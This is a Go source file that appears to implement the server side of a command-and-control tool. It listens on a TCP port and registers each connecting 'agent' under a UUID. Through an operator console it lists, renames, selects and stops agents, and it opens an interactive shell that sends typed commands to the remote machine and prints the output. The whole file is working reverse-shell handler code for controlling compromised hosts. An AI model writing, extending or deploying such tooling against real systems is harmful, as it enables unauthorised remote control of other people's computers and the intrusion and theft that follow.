package gopStation

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/google/uuid"
)

type agent struct {
	name      string
	address   string
	startTime time.Time
	Uuid      uuid.UUID
	conn      net.Conn
}

func RunServerCmd(host string, port string) {
	agentList := map[uuid.UUID]*agent{}

	address := fmt.Sprintf("%s:%s", host, port)
	fmt.Println("[+] Binding to ", address)

	listener, err := net.Listen("tcp", address)
	if err != nil {
		log.Fatal("[!] Unable to bind the address")
	}
	defer listener.Close()

	go func(listener net.Listener) {
		for {
			agentConn, err := listener.Accept()
			if err != nil {
				log.Println(err)
			}
			agentUuid := uuid.New()
			agentDate := time.Now()
			agentList[agentUuid] = &agent{
				name:      "Undefined",
				address:   agentConn.RemoteAddr().String(),
				startTime: agentDate,
				Uuid:      agentUuid,
				conn:      agentConn,
			}
			fmt.Printf("\n[+] Accepting connection from %s with UUID %s\n", agentConn.RemoteAddr().String(), agentUuid.String())
		}
	}(listener)

	var currentAgent *agent = nil

	reader := bufio.NewReader(os.Stdin)

	for {
		if currentAgent != nil {
			fmt.Printf("%s > ", currentAgent.Uuid.String())
		} else {
			fmt.Printf("$> ")
		}

		input, _ := reader.ReadString('\n')
		// convert CRLF to LF
		input = strings.Replace(input, "\n", "", -1)
		commands := strings.Split(strings.TrimSpace(input), " ")

		if currentAgent != nil {
			switch commands[0] {
			case "help":
				displayHelp()
				continue
			case "shell":
				runShell(currentAgent.conn)
				continue
			case "back":
				currentAgent = nil
				continue
			case "stop":
				currentAgent.conn.Close()
				delete(agentList, currentAgent.Uuid)
				currentAgent = nil
				continue
			case "name":
				if len(commands) < 2 {
					fmt.Print("\n[!] Please provide a name\n")
					continue
				}
				currentAgent.name = strings.Join(commands[1:], " ")
				continue
			case "info":
				fmt.Print("\nUUID - Name - Connexion address - Start date\n")
				fmt.Print("-------------------------------------------------------------\n")
				fmt.Printf("%s - %s - %s - %s\n", currentAgent.Uuid.String(),
					currentAgent.name, currentAgent.address,
					currentAgent.startTime.Format("2-1-6 3:4:5"))
				continue
			default:
				continue
			}
		} else {
			switch commands[0] {
			case "help":
				displayHelp()
			case "list":
				fmt.Print("\nAgent list\n")
				fmt.Print("\nUUID - Name - Connexion address - Start date\n")
				fmt.Print("-------------------------------------------------------------\n")
				for _, agent := range agentList {
					fmt.Printf("%s - %s - %s - %s\n", agent.Uuid.String(),
						agent.name, agent.address,
						agent.startTime.Format("2006-01-02 03:04:05 PM"))
				}
				continue
			case "use":
				if len(commands) < 2 {
					fmt.Print("\n[!] Please provide a UUID\n")
					continue
				}
				targetUuid, err := uuid.Parse(commands[1])
				if err != nil {
					fmt.Printf("\n[!] Error parsing UUID %s\n", targetUuid)
					continue
				}

				agent, present := agentList[targetUuid]
				if !present {
					fmt.Printf("\n[!] Could not find UUID %s\n", targetUuid)
					continue
				}
				currentAgent = agent
				continue
			case "name":
				if len(commands) < 2 {
					fmt.Print("\n[!] Please provide a UUID\n")
					continue
				}
				if len(commands) < 3 {
					fmt.Print("\n[!] Please provide a new name\n")
					continue
				}
				targetUuid, err := uuid.Parse(commands[1])
				if err != nil {
					fmt.Printf("\n[!] Error parsing UUID %s\n", targetUuid)
					continue
				}

				agent, present := agentList[targetUuid]
				if !present {
					fmt.Printf("\n[!] Could not find UUID %s\n", targetUuid)
					continue
				}
				agent.name = strings.Join(commands[2:], " ")
				continue
			case "stop":
				if len(commands) < 2 {
					fmt.Print("\n[!] Please provide a UUID\n")
					continue
				}
				targetUuid, err := uuid.Parse(commands[1])
				if err != nil {
					fmt.Printf("\n[!] Error parsing UUID %s\n", targetUuid)
					continue
				}

				agent, present := agentList[targetUuid]
				if !present {
					fmt.Printf("\n[!] Could not find UUID %s\n", targetUuid)
					continue
				}
				agent.conn.Close()
				delete(agentList, agent.Uuid)
				currentAgent = nil
				continue
			case "exit":
				for _, agent := range agentList {
					agent.conn.Close()
				}
				os.Exit(0)
				continue
			default:
				continue
			}
		}
	}
}

func displayHelp() {
	fmt.Printf("[+] Help from main\n")
	fmt.Printf("\t- help\tDisplay this help\n")
	fmt.Printf("\t- list\tGet a list of all the agents\n")
	fmt.Printf("\t- use [agent]\tSelect an agent based on its UUID\n")
	fmt.Printf("\t- stop [agent]\tStop specified agent by its UUID\n")
	fmt.Printf("\t- name [agent] [name]\tRename specified agent by its UUID\n")
	fmt.Printf("\t- exit\texit\n")

	fmt.Printf("\n[+] Help from an agent\n")
	fmt.Printf("\t- help\tDisplay this help\n")
	fmt.Printf("\t- shell\tRun a shell inside\n")
	fmt.Printf("\t- back\treturn to main menu from the agent\n")
	fmt.Printf("\t- stop\tStop the agent and close the connection\n")
	fmt.Printf("\t- name [name]\tChange name of the agent\n")
	fmt.Printf("\t- info\tGet information about the current agent\n")

	fmt.Printf("\n[+] Help from an agent shell\n")
	fmt.Printf("\t- !help\tDisplay this help\n")
	fmt.Printf("\t- !back\treturn to the agent\n")
}

func runShell(conn net.Conn) {

	go io.Copy(os.Stdout, conn)

	for {
		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		// convert CRLF to LF
		input = strings.Replace(input, "\n", "", -1)
		command := strings.TrimSpace(input)
		commandSlice := strings.Split(command, " ")

		switch commandSlice[0] {
		case "!help":
			displayHelp()
			continue
		case "exit":
			fmt.Println("[?] If you want to exit, please use !exit and close the connection.")
			continue
		case "!back":
			return
		default:
			_, err := io.WriteString(conn, command)
			if err != nil {
				fmt.Println(err)
				return
			}
			// io.Copy(conn, command)
			continue
		}
	}
}
